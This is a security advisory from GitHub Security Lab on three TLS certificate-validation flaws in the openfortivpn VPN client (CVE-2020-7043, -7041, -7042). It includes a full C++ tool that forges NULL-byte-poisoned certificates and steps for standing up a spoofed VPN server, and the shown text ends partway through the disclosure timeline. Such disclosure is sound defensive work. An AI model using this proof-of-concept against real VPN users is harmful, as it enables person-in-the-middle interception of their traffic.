<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">March 12, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-003, GHSL-2020-004, GHSL-2020-005: Person in the middle attack on openfortivpn clients</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/agustingianni">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/102623?s=35" height="35" width="35">
        <span>Agustin Gianni</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>Several security issues have been found in the way <code class="language-plaintext highlighter-rouge">openfortivpn</code> deals with TLS. These issues can lead to situations in which an attacker can perform a person-in-the-middle attack on clients.</p>

<h2 id="product">Product</h2>

<p>openfortivpn</p>

<h2 id="tested-version">Tested Version</h2>

<p>All our tests were conducted on version <code class="language-plaintext highlighter-rouge">v1.11.0</code>.</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-tls-certificate-commonname-null-byte-vulnerability-gsl-2020-003-cve-2020-7043">Issue 1: TLS Certificate CommonName NULL Byte Vulnerability <code class="language-plaintext highlighter-rouge">GSL-2020-003</code> (CVE-2020-7043)</h3>

<p>When <code class="language-plaintext highlighter-rouge">openfortivpn</code> is compiled against an <code class="language-plaintext highlighter-rouge">OpenSSL</code> library that does not provide the function <code class="language-plaintext highlighter-rouge">X509_check_host</code> (OpenSSL &lt; 1.0.2), the client does not properly verify the servers certificate hostname. An attacker that is able to perform a person-in-the-middle attack can exploit this, via a crafted certificate, to spoof arbitrary VPN servers and intercept network traffic.</p>

<p>As can be seen in the following snippet, the software obtains the certificate’s <code class="language-plaintext highlighter-rouge">CommonName</code> and subsequently compares it to the <code class="language-plaintext highlighter-rouge">gateway_host</code> (server hostname) by using the <code class="language-plaintext highlighter-rouge">strncasecmp</code> function. Unfortunately this function is not suitable for this task since a specially crafted certificate can contain NULL bytes in its <code class="language-plaintext highlighter-rouge">CommonName</code> field. The <code class="language-plaintext highlighter-rouge">strncasecmp</code> function will stop its comparison as soon as it encounters a NULL byte since it is a string terminator in the C programming language.</p>

<p><a href="https://github.com/adrienverge/openfortivpn/blob/master/src/tunnel.c#L667-L680">https://github.com/adrienverge/openfortivpn/blob/master/src/tunnel.c#L667-L680</a></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#ifdef HAVE_X509_CHECK_HOST
</span>    <span class="c1">// Use OpenSSL native host validation if v &gt;= 1.0.2.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">X509_check_host</span><span class="p">(</span><span class="n">cert</span><span class="p">,</span> <span class="n">common_name</span><span class="p">,</span> <span class="n">FIELD_SIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
        <span class="n">cert_valid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">#else
</span>    <span class="c1">// Use explicit CommonName check if native validation not available.</span>
    <span class="c1">// Note: this will ignore Subject Alternative Name fields.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">subj</span>
        <span class="o">&amp;&amp;</span> <span class="n">X509_NAME_get_text_by_NID</span><span class="p">(</span><span class="n">subj</span><span class="p">,</span> <span class="n">NID_commonName</span><span class="p">,</span> <span class="n">common_name</span><span class="p">,</span>
                                     <span class="n">FIELD_SIZE</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
        <span class="o">&amp;&amp;</span> <span class="n">strncasecmp</span><span class="p">(</span><span class="n">common_name</span><span class="p">,</span> <span class="n">tunnel</span><span class="o">-&gt;</span><span class="n">config</span><span class="o">-&gt;</span><span class="n">gateway_host</span><span class="p">,</span>
                       <span class="n">FIELD_SIZE</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">cert_valid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">#endif
</span></code></pre></div></div>

<p>For example, to perform a person-in-the-middle attack on the <code class="language-plaintext highlighter-rouge">vpn.legit.com</code> host, an attacker can simply create a certificate with a <code class="language-plaintext highlighter-rouge">CommonName</code> consisting of <code class="language-plaintext highlighter-rouge">vpn.legit.com\x00attacker.com</code>.</p>

<p>We have created a small tool that assists in the creation of such a certificate.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Compiling on macOS:</span>
<span class="c1">// export PKG_CONFIG_PATH="/usr/local/opt/openssl@1.1/lib/pkgconfig"</span>
<span class="c1">// clang++ create-poisoned-certificate.cpp -o create-poisoned-certificate -Wall $(pkg-config --libs --cflags openssl)</span>
<span class="cp">#include &lt;cstdio&gt;
#include &lt;cassert&gt;
#include &lt;string&gt;
#include &lt;iostream&gt;
</span>
<span class="cp">#include &lt;openssl/pem.h&gt;
#include &lt;openssl/x509.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: %s &lt;target_hostname&gt; &lt;attacker_hostname&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">target_hostname</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">attacker_hostname</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Generating a poisoned certificate:"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"  target   -&gt; "</span> <span class="o">&lt;&lt;</span> <span class="n">target_hostname</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"  attacker -&gt; "</span> <span class="o">&lt;&lt;</span> <span class="n">attacker_hostname</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

    <span class="c1">// Create the poisoned CommonName.</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">common_name</span> <span class="o">=</span> <span class="n">target_hostname</span> <span class="o">+</span> <span class="sc">'\x00'</span> <span class="o">+</span> <span class="n">attacker_hostname</span><span class="p">;</span>

    <span class="c1">// Create a new key.</span>
    <span class="n">EVP_PKEY</span> <span class="o">*</span><span class="n">pkey</span> <span class="o">=</span> <span class="n">EVP_PKEY_new</span><span class="p">();</span>
    <span class="n">assert</span><span class="p">(</span><span class="n">pkey</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not create EVP_PKEY structure."</span><span class="p">);</span>

    <span class="c1">// Generate the key.</span>
    <span class="n">RSA</span> <span class="o">*</span><span class="n">rsa</span> <span class="o">=</span> <span class="n">RSA_new</span><span class="p">();</span>
    <span class="n">assert</span><span class="p">(</span><span class="n">rsa</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not create RSA structure."</span><span class="p">);</span>

    <span class="c1">// Generate the key.</span>
    <span class="n">BIGNUM</span> <span class="o">*</span><span class="n">exponent</span> <span class="o">=</span> <span class="n">BN_new</span><span class="p">();</span>
    <span class="n">BN_set_word</span><span class="p">(</span><span class="n">exponent</span><span class="p">,</span> <span class="n">RSA_F4</span><span class="p">);</span>
    <span class="n">RSA_generate_key_ex</span><span class="p">(</span><span class="n">rsa</span><span class="p">,</span> <span class="mi">2048</span><span class="p">,</span> <span class="n">exponent</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">);</span>

    <span class="c1">// Assign it.</span>
    <span class="n">EVP_PKEY_assign_RSA</span><span class="p">(</span><span class="n">pkey</span><span class="p">,</span> <span class="n">rsa</span><span class="p">);</span>

    <span class="c1">// Create the certificate.</span>
    <span class="n">X509</span> <span class="o">*</span><span class="n">x509</span> <span class="o">=</span> <span class="n">X509_new</span><span class="p">();</span>
    <span class="n">assert</span><span class="p">(</span><span class="n">x509</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not create X509 structure."</span><span class="p">);</span>

    <span class="c1">// Fill some required fields.</span>
    <span class="n">ASN1_INTEGER_set</span><span class="p">(</span><span class="n">X509_get_serialNumber</span><span class="p">(</span><span class="n">x509</span><span class="p">),</span> <span class="mh">0xcafecafe</span><span class="p">);</span>
    <span class="n">X509_gmtime_adj</span><span class="p">(</span><span class="n">X509_get_notBefore</span><span class="p">(</span><span class="n">x509</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">X509_gmtime_adj</span><span class="p">(</span><span class="n">X509_get_notAfter</span><span class="p">(</span><span class="n">x509</span><span class="p">),</span> <span class="mh">0xdeadbeef</span><span class="p">);</span>

    <span class="c1">// Set the public key for our certificate.</span>
    <span class="n">X509_set_pubkey</span><span class="p">(</span><span class="n">x509</span><span class="p">,</span> <span class="n">pkey</span><span class="p">);</span>

    <span class="c1">// Populate the subject name.</span>
    <span class="n">X509_NAME</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="n">X509_get_subject_name</span><span class="p">(</span><span class="n">x509</span><span class="p">);</span>
    <span class="n">X509_NAME_add_entry_by_txt</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"C"</span><span class="p">,</span> <span class="n">MBSTRING_ASC</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"GH"</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">X509_NAME_add_entry_by_txt</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"O"</span><span class="p">,</span> <span class="n">MBSTRING_ASC</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"GitHub Security Lab"</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">X509_NAME_add_entry_by_txt</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"CN"</span><span class="p">,</span> <span class="n">V_ASN1_IA5STRING</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">common_name</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">common_name</span><span class="p">.</span><span class="n">size</span><span class="p">(),</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Now set the issuer name.</span>
    <span class="n">X509_set_issuer_name</span><span class="p">(</span><span class="n">x509</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>

    <span class="c1">// Sign the certificate.</span>
    <span class="n">assert</span><span class="p">(</span><span class="n">X509_sign</span><span class="p">(</span><span class="n">x509</span><span class="p">,</span> <span class="n">pkey</span><span class="p">,</span> <span class="n">EVP_sha1</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not sign certificate."</span><span class="p">);</span>

    <span class="c1">// Write the private key to disk.</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">pkey_file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"key.pem"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">);</span>
    <span class="n">assert</span><span class="p">(</span><span class="n">pkey_file</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not open key.pem"</span><span class="p">);</span>

    <span class="n">PEM_write_PrivateKey</span><span class="p">(</span><span class="n">pkey_file</span><span class="p">,</span> <span class="n">pkey</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">pkey_file</span><span class="p">);</span>

    <span class="c1">// Write the certificate to disk.</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">x509_file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"cert.pem"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">);</span>
    <span class="n">assert</span><span class="p">(</span><span class="n">x509_file</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not open cert.pem"</span><span class="p">);</span>

    <span class="n">PEM_write_X509</span><span class="p">(</span><span class="n">x509_file</span><span class="p">,</span> <span class="n">x509</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">x509_file</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>By using this tool one can create a self signed certificate:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./create-poisoned-certificate target.domain securitylab.github.com
Generating a poisoned certificate:
  target   -&gt; target.domain
  attacker -&gt; securitylab.github.com
</code></pre></div></div>

<p>As demonstrated below, the <code class="language-plaintext highlighter-rouge">CommonName</code> is poisoned with a null byte:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openssl x509 <span class="nt">-in</span> cert.pem <span class="nt">-text</span> <span class="nt">-noout</span>
Certificate:
    Data:
        Version: 1 <span class="o">(</span>0x0<span class="o">)</span>
        Serial Number: 3405695742 <span class="o">(</span>0xcafecafe<span class="o">)</span>
    Signature Algorithm: sha1WithRSAEncryption
        Issuer: <span class="nv">C</span><span class="o">=</span>GH, <span class="nv">O</span><span class="o">=</span>GitHub Security Lab, <span class="nv">CN</span><span class="o">=</span>target.domain<span class="se">\x</span>00securitylab.github.com
        Validity
            Not Before: Jan 13 16:50:18 2020 GMT
            Not After : Jun  3 14:46:17 2138 GMT
        Subject: <span class="nv">C</span><span class="o">=</span>GH, <span class="nv">O</span><span class="o">=</span>GitHub Security Lab, <span class="nv">CN</span><span class="o">=</span>target.domain<span class="se">\x</span>00securitylab.github.com
</code></pre></div></div>

<p>As an illustration we can create a fake VPN service by using the openssl command line utilities:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openssl s_server <span class="nt">-key</span> key.pem <span class="nt">-cert</span> cert.pem
Using auto DH parameters
Using default temp ECDH parameters
ACCEPT
</code></pre></div></div>

<p>We need to simulate some kind of attack, so we have added the target domain to /etc/hosts:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">grep </span>target.domain /etc/hosts
127.0.0.1       target.domain
</code></pre></div></div>

<p>To better illustrate the issue we can connect to the server with a debugger, set a few breakpoints and inspect the contents of certain variables that are relevant to hostname validation:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>lldb openfortivpn
<span class="o">(</span>lldbinit<span class="o">)</span> breakpoint <span class="nb">set</span> <span class="nt">--file</span> tunnel.c <span class="nt">--line</span> 677
<span class="o">(</span>lldbinit<span class="o">)</span> breakpoint <span class="nb">set</span> <span class="nt">--file</span> tunnel.c <span class="nt">--line</span> 683
<span class="o">(</span>lldbinit<span class="o">)</span> r target.domain:4433 <span class="nt">-u</span> username <span class="nt">-p</span> tld
Process 81513 stopped
<span class="k">*</span> thread <span class="c">#1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1</span>
    frame <span class="c">#0: 0x00000001000270fa openfortivpn`ssl_verify_cert(tunnel=0x00007ffeefbfcb80) at tunnel.c:677:6</span>
   674 		<span class="k">if</span> <span class="o">(</span>subj
   675 		    <span class="o">&amp;&amp;</span> X509_NAME_get_text_by_NID<span class="o">(</span>subj, NID_commonName, common_name,
   676 		                                 FIELD_SIZE<span class="o">)</span> <span class="o">&gt;</span> 0
-&gt; 677 		    <span class="o">&amp;&amp;</span> strncasecmp<span class="o">(</span>common_name, tunnel-&gt;config-&gt;gateway_host,
   678 		                   FIELD_SIZE<span class="o">)</span> <span class="o">==</span> 0<span class="o">)</span>
   679 			cert_valid <span class="o">=</span> 1<span class="p">;</span>
   680 	<span class="c">#endif</span>
Target 0: <span class="o">(</span>openfortivpn<span class="o">)</span> stopped.
<span class="o">(</span>lldbinit<span class="o">)</span> p common_name
<span class="o">(</span>char <span class="o">[</span>65]<span class="o">)</span> <span class="nv">$2</span> <span class="o">=</span> <span class="s2">"target.domain"</span>
<span class="o">(</span>lldbinit<span class="o">)</span> mem <span class="nb">read</span> &amp;common_name
0x7ffeefbfc460: 74 61 72 67 65 74 2e 64 6f 6d 61 69 6e 00 73 65  target.domain.se
0x7ffeefbfc470: 63 75 72 69 74 79 6c 61 62 2e 67 69 74 68 75 62  curitylab.github
<span class="o">(</span>lldbinit<span class="o">)</span> p tunnel-&gt;config-&gt;gateway_host
<span class="o">(</span>char <span class="o">[</span>65]<span class="o">)</span> <span class="nv">$4</span> <span class="o">=</span> <span class="s2">"target.domain"</span>
<span class="o">(</span>lldbinit<span class="o">)</span> c
Process 81513 stopped
<span class="k">*</span> thread <span class="c">#1, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1</span>
    frame <span class="c">#0: 0x000000010002715e openfortivpn`ssl_verify_cert(tunnel=0x00007ffeefbfcb80) at tunnel.c:683:6</span>
   680 	<span class="c">#endif</span>
   681
   682 		// Try to validate certificate using <span class="nb">local </span>PKI
-&gt; 683 		<span class="k">if</span> <span class="o">(</span>cert_valid
   684 		    <span class="o">&amp;&amp;</span> SSL_get_verify_result<span class="o">(</span>tunnel-&gt;ssl_handle<span class="o">)</span> <span class="o">==</span> X509_V_OK<span class="o">)</span> <span class="o">{</span>
   685 			log_debug<span class="o">(</span><span class="s2">"Gateway certificate validation succeeded.</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
   686 			ret <span class="o">=</span> 0<span class="p">;</span>
Target 0: <span class="o">(</span>openfortivpn<span class="o">)</span> stopped.
<span class="o">(</span>lldbinit<span class="o">)</span> p cert_valid
<span class="o">(</span>int<span class="o">)</span> <span class="nv">$7</span> <span class="o">=</span> 0x00000001
</code></pre></div></div>

<p>As can be seen in the previous example, the contents of the <code class="language-plaintext highlighter-rouge">common_name</code> buffer are not exactly a C string, but a series of bytes that when interpreted as a C string will lead to incorrect results. In this case, the buffer contains the ASCII string <code class="language-plaintext highlighter-rouge">target.domain</code> followed by a NULL byte and the rest of the domain name <code class="language-plaintext highlighter-rouge">securitylab.github.com</code>. This situation makes <code class="language-plaintext highlighter-rouge">strncasecmp</code> compare the wrong part of the <code class="language-plaintext highlighter-rouge">CommonName</code> which leads to accepting the wrong certificate (CVE-2020-7043)</p>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows an attacker that is able to get valid certificates from a CA with a specially crafted <code class="language-plaintext highlighter-rouge">CommonName</code> to perform a person-in-the-middle attack against VPN clients.</p>

<h4 id="remediation">Remediation</h4>

<p>Modern versions of OpenSSL have implemented hostname validation therefore removing the necessity of custom solutions. Unfortunately on older versions of OpenSSL, a custom solution is needed.</p>

<p>We suggest the developers follow the guidelines available in the following links:</p>

<ul>
  <li><a href="https://wiki.openssl.org/index.php/Hostname_validation">https://wiki.openssl.org/index.php/Hostname_validation</a></li>
  <li><a href="https://github.com/iSECPartners/ssl-conservatory/blob/master/openssl/openssl_hostname_validation.c">https://github.com/iSECPartners/ssl-conservatory/blob/master/openssl/openssl_hostname_validation.c</a></li>
</ul>

<p>Patch can be found here <a href="https://github.com/adrienverge/openfortivpn/commit/6328a070ddaab16faaf008cb9a8a62439c30f2a8#diff-5df244ea721353ca452473c7213d3f27">https://github.com/adrienverge/openfortivpn/commit/6328a070ddaab16faaf008cb9a8a62439c30f2a8#diff-5df244ea721353ca452473c7213d3f27</a></p>

<h3 id="issue-2-incorrect-use-of-x509_check_host-gsl-2020-004-cve-2020-7041">Issue 2: Incorrect use of X509_check_host <code class="language-plaintext highlighter-rouge">GSL-2020-004</code> (CVE-2020-7041)</h3>

<p>The <code class="language-plaintext highlighter-rouge">X509_check_host</code> function is part of a collection of functions used to match certain properties of certificates. They are used to check whether a certificate matches a given host name, email address, or IP address and are available since OpenSSL 1.0.2. In particular, the <code class="language-plaintext highlighter-rouge">X509_check_host</code> function checks if the certificate’s <code class="language-plaintext highlighter-rouge">Subject Alternative Name</code> or <code class="language-plaintext highlighter-rouge">CommonName</code> matches the specified host name.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">X509_check_host</span><span class="p">(</span><span class="n">X509</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">namelen</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">peername</span><span class="p">);</span>
</code></pre></div></div>

<p>These functions return <code class="language-plaintext highlighter-rouge">1</code> for a successful match, <code class="language-plaintext highlighter-rouge">0</code> for a failed match, <code class="language-plaintext highlighter-rouge">-1</code> for an internal error, or <code class="language-plaintext highlighter-rouge">-2</code> if the input is malformed.</p>

<p><a href="https://github.com/adrienverge/openfortivpn/blob/master/src/tunnel.c#L667-L680">https://github.com/adrienverge/openfortivpn/blob/master/src/tunnel.c#L667-L680</a></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#ifdef HAVE_X509_CHECK_HOST
</span>    <span class="c1">// Use OpenSSL native host validation if v &gt;= 1.0.2.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">X509_check_host</span><span class="p">(</span><span class="n">cert</span><span class="p">,</span> <span class="n">common_name</span><span class="p">,</span> <span class="n">FIELD_SIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
        <span class="n">cert_valid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">#else
</span>    <span class="c1">// Use explicit CommonName check if native validation not available.</span>
    <span class="c1">// Note: this will ignore Subject Alternative Name fields.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">subj</span>
        <span class="o">&amp;&amp;</span> <span class="n">X509_NAME_get_text_by_NID</span><span class="p">(</span><span class="n">subj</span><span class="p">,</span> <span class="n">NID_commonName</span><span class="p">,</span> <span class="n">common_name</span><span class="p">,</span>
                                     <span class="n">FIELD_SIZE</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
        <span class="o">&amp;&amp;</span> <span class="n">strncasecmp</span><span class="p">(</span><span class="n">common_name</span><span class="p">,</span> <span class="n">tunnel</span><span class="o">-&gt;</span><span class="n">config</span><span class="o">-&gt;</span><span class="n">gateway_host</span><span class="p">,</span>
                       <span class="n">FIELD_SIZE</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">cert_valid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">#endif
</span></code></pre></div></div>

<p>Openfortivpn unfortunately incorrectly uses this function. If an attacker can force the function to fail with a negative value, the if condition will evaluate to true, setting the value of <code class="language-plaintext highlighter-rouge">cert_valid</code> to one (valid). Making the API return a negative value is a trivial thing since any certificate with a null byte on its SAN or CN will make it return -2. (CVE-2020-7041)</p>

<h4 id="impact-1">Impact</h4>

<p>This vulnerability allows an attacker that is able to get valid certificates from a CA with a specially crafted <code class="language-plaintext highlighter-rouge">CommonName</code> to perform a person-in-the-middle attack against VPN clients.</p>

<h4 id="remediation-1">Remediation</h4>

<p>Similar to <code class="language-plaintext highlighter-rouge">GHSL-2020-003</code>. Patch can be found here <a href="https://github.com/adrienverge/openfortivpn/commit/9eee997d599a89492281fc7ffdd79d88cd61afc3#diff-5df244ea721353ca452473c7213d3f27">https://github.com/adrienverge/openfortivpn/commit/9eee997d599a89492281fc7ffdd79d88cd61afc3#diff-5df244ea721353ca452473c7213d3f27</a></p>

<h3 id="issue-3-use-of-uninitialized-memory-during-hostname-verification-gsl-2020-003-cve-2020-7042">Issue 3: Use of uninitialized memory during hostname verification <code class="language-plaintext highlighter-rouge">GSL-2020-003</code> (CVE-2020-7042)</h3>

<p>Instead of passing <code class="language-plaintext highlighter-rouge">tunnel-&gt;config-&gt;gateway_host</code> to <code class="language-plaintext highlighter-rouge">X509_check_host</code>, the <code class="language-plaintext highlighter-rouge">ssl_verify_cert</code> function passes the <code class="language-plaintext highlighter-rouge">common_name</code> string buffer, which at the point of the <code class="language-plaintext highlighter-rouge">X509_check_host</code> call is an uninitialized buffer. This leads to the application never accepting valid certificates (only malformed ones). (CVE-2020-7042)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">ssl_verify_cert</span><span class="p">(</span><span class="k">struct</span> <span class="n">tunnel</span> <span class="o">*</span><span class="n">tunnel</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">common_name</span><span class="p">[</span><span class="n">FIELD_SIZE</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>

    <span class="n">SSL_set_verify</span><span class="p">(</span><span class="n">tunnel</span><span class="o">-&gt;</span><span class="n">ssl_handle</span><span class="p">,</span> <span class="n">SSL_VERIFY_PEER</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">X509</span> <span class="o">*</span><span class="n">cert</span> <span class="o">=</span> <span class="n">SSL_get_peer_certificate</span><span class="p">(</span><span class="n">tunnel</span><span class="o">-&gt;</span><span class="n">ssl_handle</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">cert</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">log_error</span><span class="p">(</span><span class="s">"Unable to get gateway certificate.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">subj</span> <span class="o">=</span> <span class="n">X509_get_subject_name</span><span class="p">(</span><span class="n">cert</span><span class="p">);</span>
<span class="cp">#ifdef HAVE_X509_CHECK_HOST
</span>    <span class="c1">// Use OpenSSL native host validation if v &gt;= 1.0.2.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">X509_check_host</span><span class="p">(</span><span class="n">cert</span><span class="p">,</span> <span class="n">common_name</span><span class="p">,</span> <span class="n">FIELD_SIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
        <span class="n">cert_valid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">#else
</span>    <span class="c1">// Use explicit CommonName check if native validation not available.</span>
    <span class="c1">// Note: this will ignore Subject Alternative Name fields.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">subj</span>
        <span class="o">&amp;&amp;</span> <span class="n">X509_NAME_get_text_by_NID</span><span class="p">(</span><span class="n">subj</span><span class="p">,</span> <span class="n">NID_commonName</span><span class="p">,</span> <span class="n">common_name</span><span class="p">,</span>
                                     <span class="n">FIELD_SIZE</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
        <span class="o">&amp;&amp;</span> <span class="n">strncasecmp</span><span class="p">(</span><span class="n">common_name</span><span class="p">,</span> <span class="n">tunnel</span><span class="o">-&gt;</span><span class="n">config</span><span class="o">-&gt;</span><span class="n">gateway_host</span><span class="p">,</span>
                       <span class="n">FIELD_SIZE</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">cert_valid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">#endif
</span></code></pre></div></div>

<h4 id="impact-2">Impact</h4>

<p>The software incorrectly validates the identity of a certificate.</p>

<h4 id="remediation-2">Remediation</h4>

<p>Use the proper hostname variable to check against the certificate identity. Patch can be found <a href="https://github.com/adrienverge/openfortivpn/commit/9eee997d599a89492281fc7ffdd79d88cd61afc3#diff-5df244ea721353ca452473c7213d3f27">https://github.com/adrienverge/openfortivpn/commit/9eee997d599a89492281fc7ffdd79d88cd61afc3#diff-5df244ea721353ca452473c7213d3f27</a></p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<p>This report was subject to our <a href="https://securitylab.github.com/advisories/#policy">coordinated disclosure policy</a>.</p>
<ul>
  <li>01/19/2020: Report sent to Vendor</li>
  <li>01/19/2020: Vendor acknowledged report</li>
  <li>02/21/2020: Vendor proposed fixes</li>
  <li>02/24/2020: Fixes reviewed and verified</li>
